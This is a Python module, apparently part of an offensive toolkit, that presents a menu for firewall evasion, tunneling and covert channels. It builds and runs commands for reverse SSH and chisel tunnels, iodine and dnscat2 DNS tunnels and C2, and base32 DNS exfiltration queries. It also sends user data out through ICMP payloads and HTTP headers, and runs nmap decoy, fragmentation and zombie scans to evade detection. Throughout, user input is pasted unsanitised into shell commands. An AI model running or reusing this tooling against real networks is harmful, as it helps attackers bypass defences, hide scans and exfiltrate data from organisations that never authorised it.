"""
Firewall Evasion & Tunneling Module - Advanced Network Evasion
SSH tunnels, DNS tunneling, proxy chains, traffic obfuscation, and covert channels.
"""

import os
import time
from modules.utils import (
    run_command, check_tool, check_root, require_root,
    print_info, print_warning, print_error, print_status,
    print_section, print_banner, get_user_input, confirm_action,
    display_menu, Colors
)


def evasion_tunneling():
    """Firewall Evasion & Tunneling Suite."""
    while True:
        choice = display_menu("Firewall Evasion & Tunneling", [
            "SSH tunnel (local/remote/dynamic)",
            "DNS tunneling",
            "ICMP tunneling",
            "HTTP/HTTPS tunneling",
            "Proxy chain setup",
            "Traffic obfuscation (nmap evasion)",
            "Port knocking",
            "Covert channel creation",
            "Firewall rule analysis",
            "NAT traversal techniques",
            "Check evasion tools",
        ], Colors.RED)
        if choice == 0: break
        elif choice == 1: _ssh_tunnel()
        elif choice == 2: _dns_tunnel()
        elif choice == 3: _icmp_tunnel()
        elif choice == 4: _http_tunnel()
        elif choice == 5: _proxy_chain()
        elif choice == 6: _traffic_obfuscation()
        elif choice == 7: _port_knocking()
        elif choice == 8: _covert_channel()
        elif choice == 9: _firewall_analysis()
        elif choice == 10: _nat_traversal()
        elif choice == 11: _check_evasion_tools()


def _ssh_tunnel():
    """SSH tunneling - local, remote, and dynamic port forwarding."""
    sub = display_menu("SSH Tunneling", [
        "Local port forward (access remote service locally)",
        "Remote port forward (expose local service remotely)",
        "Dynamic SOCKS proxy (full tunnel)",
        "SSH over HTTP proxy (corkscrew)",
        "Reverse SSH tunnel",
        "Multi-hop SSH tunnel",
    ], Colors.RED)
    if sub == 0: return
    if sub == 1:
        host = get_user_input("SSH server (user@host)")
        local_port = get_user_input("Local port", "8080")
        remote_host = get_user_input("Remote target host", "127.0.0.1")
        remote_port = get_user_input("Remote target port", "80")
        cmd = "ssh -L %s:%s:%s %s -N" % (local_port, remote_host, remote_port, host)
        print_info("Command: %s" % cmd)
        print_info("This will forward localhost:%s -> %s:%s through %s" % (local_port, remote_host, remote_port, host))
        if confirm_action("Start tunnel?"):
            print_status("Starting SSH tunnel (Ctrl+C to stop)...")
            run_command(cmd + " &", timeout=5)
            print_info("Tunnel started in background. Test: curl http://127.0.0.1:%s" % local_port)
    elif sub == 2:
        host = get_user_input("SSH server (user@host)")
        remote_port = get_user_input("Remote port to expose on", "9090")
        local_port = get_user_input("Local service port", "80")
        cmd = "ssh -R %s:127.0.0.1:%s %s -N" % (remote_port, local_port, host)
        print_info("Command: %s" % cmd)
        print_info("This exposes your local port %s on %s:%s" % (local_port, host, remote_port))
        if confirm_action("Start tunnel?"):
            run_command(cmd + " &", timeout=5)
            print_info("Reverse tunnel started.")
    elif sub == 3:
        host = get_user_input("SSH server (user@host)")
        socks_port = get_user_input("Local SOCKS port", "1080")
        cmd = "ssh -D %s %s -N" % (socks_port, host)
        print_info("Command: %s" % cmd)
        print_info("SOCKS5 proxy on localhost:%s" % socks_port)
        print_info("Usage: curl --socks5 localhost:%s http://example.com" % socks_port)
        print_info("Or set browser proxy to SOCKS5 localhost:%s" % socks_port)
        if confirm_action("Start SOCKS proxy?"):
            run_command(cmd + " &", timeout=5)
            print_info("SOCKS proxy running on port %s" % socks_port)
    elif sub == 4:
        if not check_tool("corkscrew"):
            print_error("corkscrew required. Install: sudo apt install corkscrew")
            return
        proxy_host = get_user_input("HTTP proxy host")
        proxy_port = get_user_input("HTTP proxy port", "8080")
        ssh_host = get_user_input("SSH destination host")
        ssh_port = get_user_input("SSH destination port", "22")
        print_info("Add to ~/.ssh/config:")
        print_info("  Host tunneled")
        print_info("    ProxyCommand corkscrew %s %s %%h %%p" % (proxy_host, proxy_port))
        print_info("    Hostname %s" % ssh_host)
        print_info("    Port %s" % ssh_port)
    elif sub == 5:
        host = get_user_input("SSH server (user@host)")
        listen_port = get_user_input("Remote listen port", "4444")
        cmd = "ssh -R %s:localhost:22 %s -N" % (listen_port, host)
        print_info("Reverse tunnel: %s port %s -> your SSH" % (host, listen_port))
        print_info("Connect back: ssh -p %s user@%s" % (listen_port, host.split("@")[-1] if "@" in host else host))
        if confirm_action("Start?"):
            run_command(cmd + " &", timeout=5)
    elif sub == 6:
        hop1 = get_user_input("First hop (user@host1)")
        hop2 = get_user_input("Second hop (user@host2)")
        target = get_user_input("Final target (user@target)")
        cmd = "ssh -J %s,%s %s" % (hop1, hop2, target)
        print_info("Multi-hop command: %s" % cmd)
        print_info("Traffic path: you -> %s -> %s -> %s" % (hop1, hop2, target))


def _dns_tunnel():
    """DNS tunneling for exfiltrating data through DNS queries."""
    print_section("DNS Tunneling")
    print_warning("DNS tunneling sends data through DNS queries to bypass firewalls.")
    if check_tool("iodine"):
        sub = display_menu("DNS Tunnel Options", [
            "Start iodine server",
            "Connect as iodine client",
            "Manual DNS data exfil",
        ], Colors.RED)
        if sub == 1:
            require_root("iodine server")
            domain = get_user_input("Your DNS domain (e.g. t1.example.com)")
            password = get_user_input("Tunnel password")
            cmd = "iodined -f -P %s 10.0.0.1 %s" % (password, domain)
            print_info("Server command: %s" % cmd)
            if confirm_action("Start server?"):
                run_command(cmd + " &", timeout=5)
                print_info("iodine server started. Clients connect to %s" % domain)
        elif sub == 2:
            require_root("iodine client")
            domain = get_user_input("Server DNS domain")
            password = get_user_input("Tunnel password")
            server_ip = get_user_input("DNS server IP (or leave blank for system DNS)", "")
            if server_ip:
                cmd = "iodine -f -P %s %s %s" % (password, server_ip, domain)
            else:
                cmd = "iodine -f -P %s %s" % (password, domain)
            print_info("Client command: %s" % cmd)
            if confirm_action("Connect?"):
                stdout, _, _ = run_command(cmd, timeout=15)
                if stdout: print(stdout)
        elif sub == 3:
            _manual_dns_exfil()
    elif check_tool("dnscat2"):
        print_info("dnscat2 available - advanced DNS C2 tunnel")
        domain = get_user_input("C2 domain")
        print_info("Server: ruby dnscat2.rb %s" % domain)
        print_info("Client: ./dnscat --dns domain=%s" % domain)
    else:
        print_info("No DNS tunneling tools installed. Manual exfil available.")
        _manual_dns_exfil()


def _manual_dns_exfil():
    """Manual DNS data exfiltration demo."""
    data = get_user_input("Data to exfiltrate (short string)")
    domain = get_user_input("Base domain", "example.com")
    if not data:
        return
    import base64
    encoded = base64.b32encode(data.encode()).decode().rstrip("=").lower()
    # Split into DNS-safe chunks
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    print_section("DNS Exfil Queries")
    for i, chunk in enumerate(chunks):
        query = "%s.%d.%s" % (chunk, i, domain)
        print_info("  nslookup %s" % query)
    print_warning("Each query encodes data in the subdomain. Decoder reverses the base32.")


def _icmp_tunnel():
    """ICMP tunneling - data over ping packets."""
    print_section("ICMP Tunneling")
    if check_tool("ptunnel") or check_tool("ptunnel-ng"):
        tool = "ptunnel-ng" if check_tool("ptunnel-ng") else "ptunnel"
        require_root("ICMP tunnel")
        sub = display_menu("ICMP Tunnel", [
            "Start server (proxy)",
            "Connect as client",
        ], Colors.RED)
        if sub == 1:
            print_status("Starting ICMP tunnel proxy...")
            stdout, _, _ = run_command("%s -s 2>&1 &" % tool, timeout=5)
            print_info("ICMP proxy started. Clients connect via ping packets.")
        elif sub == 2:
            proxy = get_user_input("Proxy server IP")
            dest_host = get_user_input("Destination host")
            dest_port = get_user_input("Destination port", "22")
            local_port = get_user_input("Local listen port", "8000")
            cmd = "%s -p %s -lp %s -da %s -dp %s" % (tool, proxy, local_port, dest_host, dest_port)
            print_info("Command: %s" % cmd)
            if confirm_action("Connect?"):
                run_command(cmd + " &", timeout=5)
                print_info("Tunnel active. Connect to localhost:%s" % local_port)
    else:
        print_info("Manual ICMP data exfil:")
        require_root("ICMP exfil")
        data = get_user_input("Data to send")
        target = get_user_input("Target IP")
        if data and target:
            # Encode data in ICMP payload
            import base64
            payload = base64.b64encode(data.encode()).decode()
            cmd = "ping -c 1 -p %s %s 2>&1" % (payload[:32].encode().hex()[:32], target)
            print_info("Command: %s" % cmd)
            stdout, _, _ = run_command(cmd, timeout=10)
            if stdout: print(stdout)
        print_info("\nFor full ICMP tunneling: sudo apt install ptunnel-ng")


def _http_tunnel():
    """HTTP/HTTPS tunneling."""
    print_section("HTTP/HTTPS Tunneling")
    sub = display_menu("HTTP Tunnel Options", [
        "chisel tunnel (HTTP websocket)",
        "socat relay",
        "stunnel (SSL wrapper)",
        "HTTP CONNECT tunnel",
    ], Colors.RED)
    if sub == 1:
        if not check_tool("chisel"):
            print_error("chisel not found. Download from: https://github.com/jpillora/chisel")
            return
        mode = display_menu("Mode", ["Server", "Client"], Colors.RED)
        if mode == 1:
            port = get_user_input("Listen port", "8080")
            stdout, _, _ = run_command("chisel server --port %s --reverse 2>&1 &" % port, timeout=5)
            print_info("Chisel server started on port %s" % port)
        elif mode == 2:
            server = get_user_input("Server address (host:port)")
            tunnel = get_user_input("Tunnel spec (e.g. R:8080:localhost:80)")
            stdout, _, _ = run_command("chisel client %s %s 2>&1 &" % (server, tunnel), timeout=5)
            print_info("Chisel client connected.")
    elif sub == 2:
        if not check_tool("socat"):
            print_error("socat required. Install: sudo apt install socat")
            return
        src_port = get_user_input("Listen port", "8080")
        dst = get_user_input("Destination (host:port)", "target:80")
        dst_host, dst_port = dst.split(":")
        cmd = "socat TCP-LISTEN:%s,fork TCP:%s:%s" % (src_port, dst_host, dst_port)
        print_info("Command: %s" % cmd)
        if confirm_action("Start relay?"):
            run_command(cmd + " &", timeout=5)
            print_info("Relay active on port %s -> %s" % (src_port, dst))
    elif sub == 3:
        if not check_tool("stunnel"):
            print_error("stunnel required. Install: sudo apt install stunnel4")
            return
        print_info("stunnel wraps any TCP connection in SSL/TLS.")
        mode = get_user_input("Mode (client/server)", "client")
        accept_port = get_user_input("Accept port", "443")
        connect = get_user_input("Connect to (host:port)", "target:80")
        config = "[tunnel]\n%s = yes\naccept = %s\nconnect = %s\n" % (mode, accept_port, connect)
        config_file = "/tmp/stunnel_%d.conf" % int(time.time())
        with open(config_file, "w") as f:
            f.write(config)
        print_info("Config written: %s" % config_file)
        print_info("Start: stunnel %s" % config_file)
    elif sub == 4:
        proxy = get_user_input("HTTP proxy (host:port)")
        target = get_user_input("Target behind proxy (host:port)")
        if proxy and target:
            proxy_host, proxy_port = proxy.split(":")
            print_info("Using curl CONNECT method:")
            print_info("  curl -x http://%s http://%s" % (proxy, target))
            print_info("  curl --proxy http://%s --proxytunnel https://%s" % (proxy, target))


def _proxy_chain():
    """Proxy chain setup for anonymized traffic."""
    print_section("Proxy Chain Configuration")
    if check_tool("proxychains") or check_tool("proxychains4"):
        tool = "proxychains4" if check_tool("proxychains4") else "proxychains"
        print_info("proxychains is installed.")
        config = "/etc/proxychains.conf" if os.path.isfile("/etc/proxychains.conf") else "/etc/proxychains4.conf"
        if os.path.isfile(config):
            stdout, _, _ = run_command("tail -20 '%s'" % config)
            if stdout:
                print_section("Current Config (%s)" % config)
                print(stdout)
        sub = display_menu("Proxy Chain Options", [
            "Add SOCKS5 proxy",
            "Add SOCKS4 proxy",
            "Add HTTP proxy",
            "Test proxy chain",
            "Run command through chain",
        ], Colors.RED)
        if sub == 1:
            host = get_user_input("SOCKS5 proxy host")
            port = get_user_input("SOCKS5 proxy port", "1080")
            print_info("Add to %s:" % config)
            print_info("  socks5 %s %s" % (host, port))
        elif sub == 2:
            host = get_user_input("SOCKS4 proxy host")
            port = get_user_input("SOCKS4 proxy port", "1080")
            print_info("Add to %s:" % config)
            print_info("  socks4 %s %s" % (host, port))
        elif sub == 3:
            host = get_user_input("HTTP proxy host")
            port = get_user_input("HTTP proxy port", "8080")
            print_info("Add to %s:" % config)
            print_info("  http %s %s" % (host, port))
        elif sub == 4:
            print_status("Testing proxy chain...")
            stdout, _, _ = run_command("%s curl -s ifconfig.me 2>&1" % tool, timeout=15)
            if stdout: print_info("External IP via proxy: %s" % stdout.strip())
        elif sub == 5:
            cmd = get_user_input("Command to run through proxy chain")
            if cmd:
                print_status("Running through proxy chain...")
                stdout, _, _ = run_command("%s %s 2>&1" % (tool, cmd), timeout=30)
                if stdout: print(stdout[:3000])
    else:
        print_error("proxychains not installed. Install: sudo apt install proxychains4")
        print_info("\nManual SOCKS proxy: ssh -D 1080 user@host")
        print_info("Then: curl --socks5 localhost:1080 http://example.com")


def _traffic_obfuscation():
    """Traffic obfuscation techniques for nmap and other tools."""
    print_section("Traffic Obfuscation & Nmap Evasion")
    target = get_user_input("Target IP/hostname")
    if not target:
        return
    if not check_tool("nmap"):
        print_error("nmap required.")
        return
    sub = display_menu("Evasion Technique", [
        "Fragmented packets (-f)",
        "Decoy scan (-D)",
        "Idle/zombie scan (-sI)",
        "Source port manipulation (--source-port)",
        "MTU adjustment (--mtu)",
        "Timing evasion (-T0 paranoid)",
        "Data length padding (--data-length)",
        "Bad checksum scan (--badsum)",
        "All evasion combined",
    ], Colors.RED)
    if sub == 0: return
    if not confirm_action("Scan %s with evasion?" % target):
        return
    if sub == 1:
        cmd = "nmap -f -f %s 2>&1" % target
    elif sub == 2:
        decoys = get_user_input("Decoy IPs (comma-separated)", "RND:5")
        cmd = "nmap -D %s %s 2>&1" % (decoys, target)
    elif sub == 3:
        zombie = get_user_input("Zombie host IP")
        cmd = "nmap -sI %s %s 2>&1" % (zombie, target)
    elif sub == 4:
        port = get_user_input("Source port", "53")
        cmd = "nmap --source-port %s %s 2>&1" % (port, target)
    elif sub == 5:
        mtu = get_user_input("MTU value (multiple of 8)", "24")
        cmd = "nmap --mtu %s %s 2>&1" % (mtu, target)
    elif sub == 6:
        cmd = "nmap -T0 -sS -Pn %s 2>&1" % target
        print_warning("Paranoid timing - this will be VERY slow")
    elif sub == 7:
        length = get_user_input("Extra data bytes", "50")
        cmd = "nmap --data-length %s %s 2>&1" % (length, target)
    elif sub == 8:
        cmd = "nmap --badsum %s 2>&1" % target
    elif sub == 9:
        cmd = "nmap -f --mtu 24 -D RND:5 --source-port 53 --data-length 50 -T2 -sS -Pn %s 2>&1" % target
    else:
        return
    print_status("Running: %s" % cmd)
    stdout, _, _ = run_command(cmd, timeout=120)
    if stdout: print(stdout[:5000])


def _port_knocking():
    """Port knocking sequence to open hidden ports."""
    print_section("Port Knocking")
    sub = display_menu("Port Knock Options", [
        "Send knock sequence",
        "Set up knock daemon (knockd)",
    ], Colors.RED)
    if sub == 1:
        target = get_user_input("Target host")
        sequence = get_user_input("Port sequence (comma-separated)", "7000,8000,9000")
        if not target or not sequence:
            return
        ports = [p.strip() for p in sequence.split(",")]
        if check_tool("knock"):
            cmd = "knock %s %s" % (target, " ".join(ports))
            print_status("Knocking: %s" % cmd)
            run_command(cmd, timeout=10)
        else:
            print_status("Using nmap for knocking...")
            for port in ports:
                run_command("nmap -Pn --max-retries 0 -p %s %s 2>/dev/null" % (port, target), timeout=5)
                print_info("  Knocked port %s" % port)
                time.sleep(0.5)
        print_info("Knock sequence sent. Try connecting to the target service now.")
    elif sub == 2:
        require_root("knockd setup")
        if not check_tool("knockd"):
            print_error("knockd required. Install: sudo apt install knockd")
            return
        sequence = get_user_input("Knock sequence", "7000,8000,9000")
        open_cmd = get_user_input("Command on successful knock", "iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT")
        ports = sequence.replace(",", ",")
        config = """[options]
    logfile = /var/log/knockd.log
[openSSH]
    sequence = %s
    seq_timeout = 10
    command = %s
    tcpflags = syn
""" % (ports, open_cmd)
        config_file = "/tmp/knockd.conf"
        with open(config_file, "w") as f:
            f.write(config)
        print_info("Config written: %s" % config_file)
        print_info("Start: knockd -c %s -i eth0" % config_file)


def _covert_channel():
    """Create covert communication channels."""
    print_section("Covert Channels")
    sub = display_menu("Covert Channel Type", [
        "TCP timestamp covert channel",
        "ICMP payload channel",
        "DNS TXT record channel",
        "HTTP header covert channel",
    ], Colors.RED)
    if sub == 1:
        print_info("TCP timestamp manipulation can hide data in TCP options.")
        print_info("Tool: covert_tcp (compile from source)")
        print_info("Encode: data bits map to TCP timestamp values")
        target = get_user_input("Target IP for demo")
        if target:
            data = get_user_input("Secret message")
            if data:
                import base64
                encoded = base64.b64encode(data.encode()).hex()
                print_info("Encoded: %s" % encoded)
                print_info("Each hex char sent as TCP timestamp offset.")
    elif sub == 2:
        require_root("ICMP covert channel")
        target = get_user_input("Target IP")
        message = get_user_input("Secret message")
        if target and message:
            print_status("Sending via ICMP payload...")
            hex_msg = message.encode().hex()
            # Pad to 16 hex chars for ping -p
            padded = (hex_msg + "00" * 16)[:32]
            cmd = "ping -c 1 -p %s %s 2>&1" % (padded, target)
            stdout, _, _ = run_command(cmd, timeout=10)
            if stdout: print(stdout)
            print_info("Data sent in ICMP payload. Receiver can capture with tcpdump.")
    elif sub == 3:
        print_info("DNS TXT records can carry arbitrary data.")
        data = get_user_input("Data to encode")
        domain = get_user_input("Base domain", "example.com")
        if data:
            import base64
            encoded = base64.b64encode(data.encode()).decode()
            print_info("Create TXT record: %s.%s IN TXT \"%s\"" % ("covert", domain, encoded))
            print_info("Retrieve: dig TXT covert.%s" % domain)
    elif sub == 4:
        print_info("HTTP headers can hide data (e.g. X-Custom-Header, Cookie values).")
        data = get_user_input("Data to hide")
        target = get_user_input("Target URL", "http://example.com")
        if data:
            import base64
            encoded = base64.b64encode(data.encode()).decode()
            cmd = "curl -s -H 'X-Session-ID: %s' '%s' -o /dev/null -w '%%{http_code}'" % (encoded, target)
            print_info("Command: %s" % cmd)
            stdout, _, _ = run_command(cmd, timeout=10)
            if stdout: print_info("Response code: %s" % stdout.strip())


def _firewall_analysis():
    """Analyze firewall rules and find weaknesses."""
    require_root("Firewall analysis")
    print_section("Firewall Rule Analysis")
    # iptables
    stdout, _, _ = run_command("iptables -L -n -v 2>&1")
    if stdout and "Permission denied" not in stdout:
        print_section("iptables Rules")
        print(stdout)
        # Analyze for weaknesses
        if "ACCEPT     all" in stdout:
            print_warning("ACCEPT ALL rule found - potential security risk!")
        if stdout.count("ACCEPT") > 20:
            print_warning("Many ACCEPT rules (%d) - review for unnecessary access" % stdout.count("ACCEPT"))
    # iptables NAT
    stdout, _, _ = run_command("iptables -t nat -L -n -v 2>&1")
    if stdout and "Permission denied" not in stdout:
        print_section("NAT Rules")
        print(stdout)
    # nftables
    stdout, _, _ = run_command("nft list ruleset 2>&1")
    if stdout and "Permission denied" not in stdout and stdout.strip():
        print_section("nftables Rules")
        print(stdout[:3000])
    # UFW
    if check_tool("ufw"):
        stdout, _, _ = run_command("ufw status verbose 2>&1")
        if stdout:
            print_section("UFW Status")
            print(stdout)
    # firewalld
    if check_tool("firewall-cmd"):
        stdout, _, _ = run_command("firewall-cmd --list-all 2>&1")
        if stdout:
            print_section("firewalld")
            print(stdout)


def _nat_traversal():
    """NAT traversal techniques."""
    print_section("NAT Traversal Techniques")
    sub = display_menu("NAT Traversal", [
        "STUN (discover NAT type & external IP)",
        "UPnP port mapping",
        "NAT-PMP / PCP",
        "Hole punching info",
    ], Colors.RED)
    if sub == 1:
        if check_tool("stun"):
            print_status("Querying STUN server...")
            stdout, _, _ = run_command("stun stun.l.google.com:19302 2>&1", timeout=10)
            if stdout: print(stdout)
        else:
            print_status("Using Python to query STUN...")
            stdout, _, _ = run_command(
                "curl -s 'https://api.ipify.org?format=json' 2>&1", timeout=5)
            if stdout: print_info("External IP: %s" % stdout.strip())
            print_info("For full STUN: sudo apt install stun-client")
    elif sub == 2:
        if check_tool("upnpc"):
            print_status("Querying UPnP devices...")
            stdout, _, _ = run_command("upnpc -s 2>&1", timeout=10)
            if stdout: print(stdout)
            port = get_user_input("Port to forward externally", "")
            if port:
                proto = get_user_input("Protocol (TCP/UDP)", "TCP")
                run_command("upnpc -a @ %s %s %s 2>&1" % (port, port, proto), timeout=10)
                print_info("UPnP mapping added: external:%s -> local:%s" % (port, port))
        else:
            print_error("upnpc required. Install: sudo apt install miniupnpc")
    elif sub == 3:
        print_info("NAT-PMP (Apple) / PCP (IETF) are router-level port mapping protocols.")
        if check_tool("natpmpc"):
            stdout, _, _ = run_command("natpmpc 2>&1", timeout=5)
            if stdout: print(stdout)
        else:
            print_info("Install: sudo apt install libnatpmp-dev")
    elif sub == 4:
        print_info("UDP Hole Punching:")
        print_info("  1. Both peers contact a known server (STUN)")
        print_info("  2. Server relays each peer's public IP:port")
        print_info("  3. Both peers send UDP packets to each other")
        print_info("  4. NAT creates mapping, allowing bidirectional flow")
        print_info("\nTools: pwnat, UDP hole puncher scripts")


def _check_evasion_tools():
    """Check available evasion/tunneling tools."""
    print_section("Evasion & Tunneling Tools")
    tools = {
        "ssh": "SSH tunneling",
        "nmap": "Network scanner with evasion",
        "proxychains4": "Proxy chain wrapper",
        "socat": "Multipurpose relay",
        "chisel": "HTTP tunnel (websocket)",
        "stunnel4": "SSL/TLS wrapper",
        "corkscrew": "SSH over HTTP proxy",
        "iodine": "DNS tunnel",
        "ptunnel-ng": "ICMP tunnel",
        "knock": "Port knock client",
        "knockd": "Port knock daemon",
        "tor": "Tor anonymity network",
        "obfs4proxy": "Tor pluggable transport",
        "ncat": "Nmap netcat (SSL support)",
        "cryptcat": "Encrypted netcat",
        "stun": "STUN client",
        "upnpc": "UPnP NAT client",
    }
    available = []
    missing = []
    for tool, desc in tools.items():
        if check_tool(tool):
            print_info("  [+] %-16s - %s" % (tool, desc))
            available.append(tool)
        else:
            print_error("  [-] %-16s - %s" % (tool, desc))
            missing.append(tool)
    print_info("\nAvailable: %d/%d" % (len(available), len(tools)))
    if missing and confirm_action("Install common tunneling tools?"):
        run_command("sudo apt install -y socat proxychains4 knockd stunnel4 corkscrew tor ncat miniupnpc 2>&1", timeout=120)
